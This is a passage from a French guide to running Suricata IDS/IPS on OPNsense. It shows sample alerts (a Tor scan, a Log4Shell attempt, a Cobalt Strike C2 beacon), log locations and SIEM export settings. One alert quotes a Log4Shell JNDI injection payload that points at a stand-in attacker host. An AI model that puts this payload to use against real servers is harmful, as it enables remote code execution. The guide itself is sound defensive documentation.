---
id: collect-261001-opnsense-pfsense/opnsense-pfsense/guides-guide-suricata-ids-ips-opnsense-pdf-271a574c-2
title: "Interfaces à surveiller selon la topologie BOTUM :"
domain: opnsense-pfsense
role: reference
task: reference
actors: []
dates: []
keywords: ["exploit"]
source: docs/RAG/collect-261001-opnsense-pfsense/guides-guide-suricata-ids-ips-opnsense-pdf-271a574c.md
source_anchor: ""
source_lines: [145, 216]
sha256: 2b42c0a98758d6b869e68024ba7b04496838c42ecd8f7f4d380999d9baca654c
---

# Interfaces à surveiller selon la topologie BOTUM :

Suricata IDS/IPS avec OPNsense — Guide Complet
BOTUM INC.
botum.ca
Page 5
SID : 2000545
Sévérité: Medium
Source : 185.220.101.42:54932
Dest : [WAN IP]:22
Proto : TCP
Action : Alert (IDS) ou Drop (IPS)
→ Indication : scan automatisé depuis un nœud Tor/proxy
→ Action recommandée : vérifier si l'IP est aussi dans CrowdSec
Exemple 2 : Tentative d'exploit
 Alerte : ET WEB_SERVER Possible CVE-2021-44228 Log4j RCE
SID : 2034647
Sévérité: Critical
Source : 45.33.32.156:80
Dest : 192.168.20.15:8080 (serveur IoT)
Proto : TCP/HTTP
Payload : ${jndi:ldap://evil.attacker.com/exploit}
→ Tentative d'injection Log4Shell
→ Action : bloquer immédiatement, isoler l'hôte destination
Exemple 3 : Communication malware C2
 Alerte : ET MALWARE Cobalt Strike Beacon
SID : 2027865
Sévérité: High
Source : 192.168.30.25 (VLAN Guest)
Dest : 162.55.201.180:443
Proto : TCP/TLS
→ Machine Guest tente de contacter un serveur C2 Cobalt Strike
→ Action immédiate : isoler la machine, analyser le disque
8. Intégration avec les logs OPNsense
Suricata s'intègre nativement avec le système de logs OPNsense et peut envoyer ses alertes vers des systèmes
SIEM externes.
Logs locaux OPNsense
 # Consulter les alertes Suricata :
Services > Intrusion Detection > Alerts
→ Interface web avec filtrage par sévérité, IP, SID
# Logs bruts sur le filesystem :
/var/log/suricata/eve.json ← format JSON structuré (complet)
/var/log/suricata/fast.log ← format texte rapide
/var/log/suricata/stats.log ← statistiques performance
Export vers Graylog / Elastic Stack
 # Configurer l'export syslog vers SIEM :

Suricata IDS/IPS avec OPNsense — Guide Complet
BOTUM INC.
botum.ca
Page 6
System > Settings > Logging
Remote syslog server : 192.168.10.100:514
Log everything : cocher
# Format eve.json pour Filebeat/Logstash :
input {
file {
path => "/var/log/suricata/eve.json"
codec => "json"
type => "suricata"
}
}
filter {
if [type] == "suricata" {
date { match => ["timestamp", "ISO8601"] }
}
}
9. Prochaines étapes
Suricata est maintenant en place et surveille activement le trafic. La couche DPI vient compléter CrowdSec (Billet 5)
et le NAC 802.1X (Billet 6) pour former une défense réseau multicouche.
Le Billet 8 de la série couvrira AdGuard Home intégré à OPNsense : filtrage DNS, blocage de publicités et trackers
à l'échelle du réseau, listes personnalisées, et statistiques DNS centralisées.
Article complet : blog.botum.ca/opnsense-suricata-ids-ips-dpi
Site web : www.botum.ca  contact@botum.ca
